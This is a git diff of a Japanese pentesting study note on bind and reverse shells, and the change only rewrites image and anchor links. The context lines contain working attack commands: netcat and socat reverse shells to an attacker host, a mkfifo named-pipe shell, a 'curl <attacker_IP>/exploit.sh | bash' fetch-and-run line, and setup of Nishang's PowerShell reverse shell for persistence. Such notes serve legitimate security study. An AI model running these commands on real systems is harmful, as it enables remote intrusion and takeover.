@@ -19,7 +19,7 @@
 
  * ユーザーの入力を常に待ち受け、実行結果が即座に返ってくる対話型
  * プロンプト（`$` や `#`）が表示され、タブ補完や履歴機能、ジョブコントロールが利用可能
- ![[Pasted image 20230318182041.png]]
+ ![](../../画像ファイル/Pasted%20image%2020230318182041.png)
 
 ### 非インタラクティブシェル（非対話型シェル）
 
@@ -27,7 +27,7 @@
  * Reverse ShellやBind Shellの初期状態（いわゆるDumb Shell）の多くはこの形式
  * ユーザーに入力を求めるプログラム（sshのパスワード入力、sudoのプロンプトなど）は、対話のための端末デバイスがないため実行できない
  * 下のキャプチャのように、引数だけで完結するwhoamiは問題なく実行できるが、対話的なセッションを必要とするsshは正常に動作しない
-   ![[Pasted image 20230318182007.png | 300]]
+   ![ 300](../../画像ファイル/Pasted%20image%2020230318182007.png)
    （上記listenerコマンドはsudo rlwrap nc -lvnp 443のaliasとして説明している）
 
 ## Bind Shellとは
@@ -46,7 +46,7 @@ nc -lvnp <Port> -e "cmd.exe"
 ```zsh
 nc <target_IP> <Port>
 ```
-![[Pasted image 20230318180927.png | 900]]
+![ 900](../../画像ファイル/Pasted%20image%2020230318180927.png)
 $$左が攻撃側、右がターゲット側$$
 
 ## Reverse Shellとは
@@ -64,7 +64,7 @@ sudo rlwrap nc -lvnp <Port>
 ```
 nc <attacker_IP> <Port> -e /bin/bash
 ```
-![[Pasted image 20230318180351.png]]
+![](../../画像ファイル/Pasted%20image%2020230318180351.png)
 $$左が攻撃側、右がターゲット側$$
 
 ---
@@ -82,7 +82,7 @@ $$左が攻撃側、右がターゲット側$$
 > 実践ではほとんど使わない。
 
 1. ターゲットマシン上でリスナーを用意する
-	 ([What is the shell](What%20is%20the%20shell.md#補足：名前付きパイプコマンドの解説))
+	 ([What is the shell](#補足：名前付きパイプコマンドの解説))
 ```zsh
 mkfifo /tmp/f; nc -lvnp <Port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
@@ -306,13 +306,13 @@ sudo rlwrap nc -lvnp <Port>
 curl <attacker_IP>/exploit.sh | bash
 ```
 
-5. リバースシェルを確立したら、[What is the shell](What%20is%20the%20shell.md#安定化%20w/%20Python)へ進む
+5. リバースシェルを確立したら、[What is the shell](#安定化%20w/%20Python)へ進む
 
 ---
 
 ## 🪟 Windowsターゲット向け安定化
 
-Windowsでは安定化する手法が限られており、効果的な手法は[What is the shell](What%20is%20the%20shell.md#OS共通：rlwrapを使ってリスナーを立てる)か、[What is the shell](What%20is%20the%20shell.md#Metasploit%20-%20multi/handler)を使う
+Windowsでは安定化する手法が限られており、効果的な手法は[What is the shell](#OS共通：rlwrapを使ってリスナーを立てる)か、[What is the shell](#Metasploit%20-%20multi/handler)を使う
 
 その他、PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
 ```powershell
@@ -370,7 +370,7 @@ socat TCP:<attacker_IP>:<Port> EXEC: "bash -li",pty,stderr,sigint,setsid,sane
 - `setsid`： 新しいセッションでプロセスを作成する
 - `sane`：端末を安定させる
 
-![[Pasted image 20230319131940.png | 800]]
+![ 800](../../画像ファイル/Pasted%20image%2020230319131940.png)
 $$Socatによる安定化実例$$
 
 ### Reverse Shell w/ Socat(非対話型)
@@ -420,7 +420,7 @@ socat TCP:<target_IP>:<Port> -
 [Nishang - GitHub](https://github.com/samratashok/nishang)（apt install対応）
 
 - 目的：Windowsマシンへの侵害後、永続化のため
-	- 他の[What is the shell](What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)などがうまくいかないときに使う
+	- 他の[What is the shell](#Base64化したPowerShellリバースシェルワンライナー)などがうまくいかないときに使う
 
 1. 攻撃者のマシンでリバースシェルペイロードスクリプトを用意する
 ```zsh
@@ -431,7 +431,7 @@ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
 ```zsh
 subl Invoke-PowerShellTcpOneLine.ps1
 ```
-![[Pasted image 20251107074119.png]]
+![](../../画像ファイル/Pasted%20image%2020251107074119.png)
 $$ペイロードは赤枠部分を使う(smは圧縮版）$$
 
 3. PowerShellスクリプトをシェルから直接渡すため、Base64エンコードする
